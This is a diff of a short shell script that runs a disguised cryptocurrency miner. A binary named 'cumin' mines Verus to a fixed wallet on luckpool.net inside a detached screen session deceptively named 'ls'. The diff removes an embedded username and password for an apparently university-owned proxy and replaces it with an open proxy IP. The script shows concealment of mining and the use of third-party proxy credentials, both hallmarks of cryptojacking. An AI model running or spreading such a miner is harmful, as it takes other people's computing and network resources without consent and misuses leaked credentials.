@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RXM8Btq8mJuPPk19t7B6hgZsty7p14cbpG
 WORKER=$(echo $(shuf -i 1-1 -n 1)-YX)
-PROXY=http://ITS-576049-ed8ad:dbf6a@proxy.its.ac.id:8080
+PROXY=http://193.41.88.58:53281
 ./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
